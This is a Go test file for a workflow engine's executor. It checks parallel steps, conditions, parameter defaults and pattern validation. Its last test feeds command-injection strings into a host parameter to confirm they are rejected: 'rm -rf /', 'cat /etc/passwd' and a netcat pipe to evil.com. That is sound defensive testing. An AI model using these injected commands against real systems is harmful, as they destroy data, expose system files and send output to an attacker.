package engine

import (
	"context"
	"io"
	"log/slog"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/suite"
	"github.com/tailflow/tailflow/internal/action"
	"github.com/tailflow/tailflow/internal/event"
	"github.com/tailflow/tailflow/internal/parser"
)

// eventCollector accumulates values emitted on the event bus from a subscriber
// goroutine while letting the test body read them safely. The mutex guards the
// slice against the goroutine still appending later events when the body reads.
type eventCollector[T any] struct {
	mu    sync.Mutex
	items []T
	count atomic.Int32
}

func (c *eventCollector[T]) add(item T) {
	c.mu.Lock()
	c.items = append(c.items, item)
	c.mu.Unlock()
	c.count.Add(1)
}

func (c *eventCollector[T]) load() int32 {
	return c.count.Load()
}

func (c *eventCollector[T]) snapshot() []T {
	c.mu.Lock()
	defer c.mu.Unlock()

	out := make([]T, len(c.items))
	copy(out, c.items)

	return out
}

func newTestExecutor() (*Executor, *event.Bus) {
	bus := event.NewBus()
	reg := action.NewRegistry()
	action.RegisterBuiltins(reg)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	return NewExecutor(reg, bus, logger, nil, nil, nil), bus
}

type EngineTestSuite struct {
	suite.Suite
}

func TestEngine(t *testing.T) {
	suite.Run(t, new(EngineTestSuite))
}

func (s *EngineTestSuite) SetupTest() {}

func (s *EngineTestSuite) TestSimpleWorkflow() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test",
		Steps: []parser.Step{
			{
				ID:     "log1",
				Action: "log",
				Config: map[string]any{"message": "hello"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["log1"].Status)
}

func (s *EngineTestSuite) TestParallelSteps() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Two independent steps that should run in parallel
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "parallel",
		Steps: []parser.Step{
			{
				ID:     "a",
				Action: "delay",
				Config: map[string]any{"duration": "50ms"},
			},
			{
				ID:     "b",
				Action: "delay",
				Config: map[string]any{"duration": "50ms"},
			},
			{
				ID:        "c",
				Action:    "log",
				DependsOn: []string{"a", "b"},
				Config:    map[string]any{"message": "done"},
			},
		},
	}

	start := time.Now()
	result, err := exec.Execute(context.Background(), wf, nil)
	elapsed := time.Since(start)

	s.Require().NoError(err)
	s.Equal("success", result.Status)
	// If parallel, should take ~50ms not ~100ms
	s.Less(elapsed, 150*time.Millisecond)
}

func (s *EngineTestSuite) TestWhenCondition() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "conditional",
		Params:  []parser.Param{{Name: "skip", Type: "bool", Default: true}},
		Steps: []parser.Step{
			{
				ID:     "maybe",
				Action: "log",
				When:   "params.skip == false",
				Config: map[string]any{"message": "should not run"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("skipped", result.Steps["maybe"].Status)
}

func (s *EngineTestSuite) TestWhenConditionTrue() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "conditional-true",
		Params:  []parser.Param{{Name: "run", Type: "bool", Default: true}},
		Steps: []parser.Step{
			{
				ID:     "maybe",
				Action: "log",
				When:   "params.run == true",
				Config: map[string]any{"message": "should run"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["maybe"].Status)
}

func (s *EngineTestSuite) TestParamDefaults() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "params",
		Params: []parser.Param{
			{Name: "env", Type: "string", Default: "staging"},
		},
		Steps: []parser.Step{
			{
				ID:     "log1",
				Action: "log",
				Config: map[string]any{"message": "env={{ params.env }}"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestRequiredParamMissing() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "params",
		Params: []parser.Param{
			{Name: "env", Type: "string", Required: true},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "test"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Error(err)
	s.Contains(err.Error(), "required parameter")
}

func (s *EngineTestSuite) TestParamPatternValid() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-test",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-zA-Z0-9._-]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.host }}"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestParamPatternInjection() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-test",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-zA-Z0-9._-]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.host }}"}},
		},
	}

	// Injection attempt with &&
	_, err := exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr && rm -rf /"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")

	// Injection attempt with ;
	_, err = exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr; cat /etc/passwd"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")

	// Injection attempt with |
	_, err = exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr | nc evil.com 4444"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")
}

